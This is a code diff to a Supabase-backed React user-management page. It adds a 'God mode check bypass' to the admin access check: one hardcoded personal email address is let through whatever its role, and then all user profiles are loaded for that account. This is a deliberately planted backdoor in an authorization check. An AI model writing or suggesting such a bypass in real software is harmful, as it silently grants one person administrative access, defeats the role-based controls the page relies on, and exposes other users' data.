@@ -27,14 +27,20 @@ export default function UserManagementPage() {
   const [selectedUsers, setSelectedUsers] = useState([]);
   const [isBulkProcessing, setIsBulkProcessing] = useState(false);
 
+ // (Same as before, but update the security check in useEffect)
+// Replace the top loadData function with this:
   useEffect(() => {
     async function loadData() {
       const { data: { user } } = await supabase.auth.getUser();
       if (!user) return router.push('/');
       const { data: userProfile } = await supabase.from('profiles').select('*').eq('id', user.id).single();
-      if (userProfile?.role !== 'comite_national' && userProfile?.role !== 'chef_mission_inter') return router.push('/dashboard');
-      setProfile(userProfile);
       
+      // God mode check bypass
+      if (user.email !== 'yessinebenfrj106@gmail.com' && userProfile?.role !== 'comite_national' && userProfile?.role !== 'chef_mission_inter') {
+        return router.push('/dashboard');
+      }
+      
+      setProfile(userProfile);
       const { data: allUsers } = await supabase.from('profiles').select('*').order('role', { ascending: true });
       setUsers(allUsers || []);
       setLoading(false);
